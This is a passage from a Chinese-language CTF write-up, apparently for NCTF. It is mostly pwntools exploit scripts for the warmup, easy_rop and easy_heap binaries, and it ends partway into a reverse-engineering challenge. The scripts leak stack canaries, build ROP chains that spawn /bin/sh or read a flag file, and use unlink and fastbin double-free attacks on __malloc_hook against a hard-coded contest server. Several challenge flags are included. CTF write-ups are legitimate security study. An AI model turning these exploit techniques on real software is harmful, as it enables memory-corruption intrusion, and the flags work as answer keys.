        p.sendline(str(index))
    def edit(index,content):
        p.recvuntil('5,exit\n')
        p.sendline('4')
        p.recvuntil('idx:\n')
        p.sendline(str(index))
        p.recvuntil('content:\n')
        p.send(content)
    add(0x10,'\x00'*0x10) #0
    add(0x10,'\x11'*0x10) #1
    delete(0)
    delete(1)
    p.recvuntil('5,exit\n')
    p.sendline('1')
    p.recvuntil('size:\n')
    p.sendline('0')
    p.recvuntil('content:\n')
    edit(0,'\x50')
    show(0)
    heap_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x50
    log.success('heap_addr = '+hex(heap_addr))
    add(0x38,'\x11'*0x30) #1
    add(0xf0,'\x22'*0xf0) #2
    add(0x20,'\x33'*0x20) #3
    delete(1)
    payload = p64(0) + p64(0x31) + p64(0x6020e8-0x18) + p64(0x6020e8-0x10) + p64(0)*2 + p64(0x30)
    add(0x38,payload)
    delete(2)
    payload = p64(0)*2 + p64(heap_addr+0x10)
    edit(1,payload)
    edit(0,p64(0x66666666))
    p.recvuntil('5,exit\n')
    p.sendline('5')
    #NCTF{Ohh!h0pe_y0u_c4n_pwn_100years_too}
    if attach == 1:
        gdb.attach(p)
    p.interactive()
### warmup
基础rop
    #coding:utf-8
    from pwn import *
    path = './warm_up'
    local = 1
    attach = 0
    P = ELF(path)
    context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])
    context.log_level = 'debug'
    if local == 0:
        p = process(path)
        if context.arch == 'amd64':
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        else:
            libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    else:
        p = remote('139.129.76.65',50007)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p.recvuntil('p!!!\n')
    p.send('\x11'*0x18+'\x12')
    p.recvuntil('\x12')
    canary = u64(p.recv(7)+'\x00')
    log.success('canary = '+hex(canary))
    p.recvuntil('?')
    payload = p64(0)*3 + '\x00' + p64(canary)[:7]
    payload+= p64(0)
    payload+= p64(0x400ab6)
    p.send(payload)
    p.recvuntil('warm up!!!')
    p.send('\x11'*0x2f+'\x12')
    p.recvuntil('\x12')
    libcbase = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['__libc_start_main'] - 240
    log.success('libcbase = '+hex(libcbase))
    p_rdx_rsi = 0x00000000001150c9 + libcbase
    p_rdi = 0x400bc3
    p_rbp = 0x400970
    leave = 0x400a49
    flag_addr = 0x601a00 + 0x98
    p.recvuntil('?')
    payload = p64(0)*3 + '\x00' + p64(canary)[:7]
    payload+= p64(0)
    payload+= p64(p_rdi) + p64(0)
    payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601a00)
    payload+= p64(libcbase+libc.sym['read'])
    payload+= p64(p_rbp) + p64(0x601a00)
    payload+= p64(leave)  
    p.send(payload)
    raw_input()
    payload = p64(0x601a00)
    payload+= p64(p_rdi) + p64(flag_addr)
    payload+= p64(p_rdx_rsi) + p64(0) + p64(0)
    payload+= p64(libcbase+libc.sym['open'])
    payload+= p64(p_rdi) + p64(3)
    payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601b00)
    payload+= p64(libcbase+libc.sym['read'])
    payload+= p64(p_rdi) + p64(1)
    payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601b00)
    payload+= p64(libcbase+libc.sym['write'])
    payload+= './flag'
    p.send(payload)
    if attach == 1:
        gdb.attach(p)
    p.interactive()
### easy_rop
基础rop
    #coding:utf-8
    from pwn import *
    path = './easy_rop'
    local = 1
    attach = 0
    P = ELF(path)
    context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])
    context.log_level = 'debug'
    if local == 0:
        p = process(path)
        if context.arch == 'amd64':
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        else:
            libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    else:
        p = remote('139.129.76.65',50002)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    for i in range(26):
        p.recvuntil(': ')
        p.sendline(str(0))
    p.recvuntil(': ')
    p.sendline('+') 
    p.recvuntil(': ')
    p.sendline('+')
    p.recvuntil(': ')
    p.sendline('+')
    p.recvuntil('28 = ')
    base1 = int(p.recvuntil('\n',drop=True),10)
    log.success('base1 = '+hex(base1))
    p.recvuntil(': ')
    p.sendline('+')
    p.recvuntil('29 = ')
    base2 = int(p.recvuntil('\n',drop=True),10)
    log.success('base2 = '+hex(base2))
    base = str(hex(base2))+str(hex(base1))[2:]
    base = int(base,16) - (0x55e9d0e36b40-0x000055e9d0e36000) 
    log.success('base = '+hex(base))
    start = base + 0x8a0
    start1 = str(hex(start))[2:6]
    start2 = str(hex(start))[6:]
    start1 = int(start1,16)
    start2 = int(start2,16)
    p.recvuntil(': ')
    p.sendline(str(start2))
    p.recvuntil(': ')
    p.sendline(str(start1))
    p.recvuntil(': ')
    p.sendline('+')
    p.recvuntil(': ')
    p.sendline('+')
    p.recvuntil('your name?\n')
    p.send('\x00')
    #======================================
    for i in range(26):
        p.recvuntil(': ')
        p.sendline(str(0))
    p.recvuntil(': ')
    p.sendline('+') 
    p.recvuntil(': ')
    p.sendline('+')
    target = base + 0x201420
    target1 = str(hex(target))[2:6]
    target2 = str(hex(target))[6:]
    target1 = int(target1,16)
    target2 = int(target2,16)
    p.recvuntil(': ')
    p.sendline(str(target2))
    p.recvuntil(': ')
    p.sendline(str(target1))
    leave = base + 0xb31
    leave1 = str(hex(leave))[2:6]
    leave2 = str(hex(leave))[6:]
    leave1 = int(leave1,16)
    leave2 = int(leave2,16)
    p.recvuntil(': ')
    p.sendline(str(leave2))
    p.recvuntil(': ')
    p.sendline(str(leave1))
    p.recvuntil(': ')
    p.sendline('+') 
    p.recvuntil(': ')
    p.sendline('+')
    part1 = base + 0xb96
    part2 = base + 0xb80
    def call_fun(fun_addr,arg1,arg2,arg3):
        payload = p64(part1)
        payload+= p64(0) 
        payload+= p64(0)
        payload+= p64(1)
        payload+= p64(fun_addr)
        payload+= p64(arg1)
        payload+= p64(arg2)
        payload+= p64(arg3)
        payload+= p64(part2)
        payload+= 'a'*0x38
        return payload
    p_rdi = base + 0xba3
    p_rbp = base + 0x900
    p.recvuntil('your name?\n')
    payload = p64(target)
    payload+= p64(p_rdi)
    payload+= p64(P.got['puts']+base)
    payload+= p64(P.plt['puts']+base)
    payload+= call_fun(P.got['read']+base,0x100,base+0x201500,0)
    payload+= p64(p_rbp)
    payload+= p64(base+0x201500)
    payload+= p64(leave)
    p.send(payload)
    libcbase = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['puts']
    log.success('libcbase = '+hex(libcbase))
    payload = p64(base+0x201500)
    payload+= p64(p_rdi)
    payload+= p64(libcbase+libc.search('/bin/sh\x00').next())
    payload+= p64(libcbase+libc.sym['system'])
    p.send(payload)
    #NCTF{rop_1s_b4st!!!!}
    if attach == 1:
        gdb.attach(p)
    p.interactive()
### easy_heap
两次fb_atk
    #coding:utf-8
    from pwn import *
    path = './easy_heap'
    local = 1
    attach = 0
    #P = ELF(path)
    context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])
    context.log_level = 'debug'
    if local == 0:
        p = process(path)
        if context.arch == 'amd64':
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        else:
            libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    else:
        p = remote('139.129.76.65',50001)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    def new(size,content):
        p.recvuntil('4. exit\n')
        p.sendline('1')
        p.recvuntil('size?\n')
        p.sendline(str(size))
        p.recvuntil('ontent?\n')
        p.send(content)
    def delete(index):
        p.recvuntil('4. exit\n')
        p.sendline('2')
        p.recvuntil('index?\n')
        p.sendline(str(index))
    def show(index):
        p.recvuntil('4. exit\n')
        p.sendline('3')
        p.recvuntil('index?\n')
        p.sendline(str(index))
    p.recvuntil('your name?\n')
    p.send(p64(0)+p64(0x60))
    new(0x50,'\x00'*0x50) #0
    new(0x50,'\x11'*0x50) #1
    delete(0)
    delete(1)
    delete(0)
    new(0x50,p64(0x602060))
    new(0x50,'\x33'*0x50)
    new(0x50,'\x44'*0x50)
    payload = p64(0) + p64(0x1000) + p64(0)*8
    new(0x50,payload)
    new(0x80,'\x00') #0
    new(0x60,'\x11'*0x60) #1
    delete(0)
    show(0)
    p.recvuntil('0: ')
    libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f54cfedab78-0x00007f54cfb16000)
    log.success('libcbase = '+hex(libcbase))
    new(0x60,'\x22'*0x60)
    delete(1)
    delete(2)
    delete(1)
    new(0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23))
    new(0x60,'\x00')
    new(0x60,'\x00')
    one_gadget = [0x4526a,0x45216,0xf02a4,0xf1147]
    payload = '\x00'*0x13 + p64(libcbase+one_gadget[2])
    new(0x60,payload)
    delete(6)
    if attach == 1:
        gdb.attach(p)
    p.interactive()
## Re
### 签到题
IDA打开  
进到`sub_401340`中  
就是有一个7*7的矩阵和我们输入的49位字符的ASCII码按列排布构成的矩阵(第一列是a[0]~a[6])相乘会得到dword_404000  
除了`dword_404000[0]=4884h`外都是4行代表一个元素,即
    dword_404000[1]=91C4h
    dword_404000[2]=7D35h
    dword_404000[3]=81FEh